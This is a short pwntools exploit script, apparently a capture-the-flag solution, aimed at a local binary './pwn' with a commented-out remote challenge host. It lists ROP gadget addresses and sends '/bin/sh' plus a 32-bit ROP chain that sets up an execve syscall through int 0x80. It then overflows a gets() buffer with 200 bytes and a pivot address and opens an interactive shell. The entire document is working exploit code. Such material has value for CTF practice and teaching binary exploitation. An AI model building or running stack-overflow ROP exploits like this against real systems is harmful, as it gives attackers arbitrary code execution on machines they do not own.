from pwn import *

edi_add=0x8049a80
esi_add=0x804fc5f

eax_add=0x80b470a

ebx_add=0x08049022
ecx_add=0x08049802
edx_add=0x08060bd1
int80=0x08049c6a
syscall=0x08064acd

mprotect=0x08070A70
r=process("./pwn")
#r=remote("node1.tgctf.woooo.tech",30754)
gdb.attach(r)
pause()
r.recvuntil(b"could you tell me your name?")
r.send(b"/bin/sh\x00"+p32(0)+p32(0x080EF334)+p32(ebx_add)+p32(0x080EF320)+p32(ecx_add)+p32(0)+p32(edx_add)+p32(0)+p32(eax_add)+p32(0xb)+p32(int80))
r.recvuntil("i heard you love gets,right?")

pay=b'a'*200+p32(0x080EF334)
r.sendline(pay)
r.interactive()

#b*0x080498C9
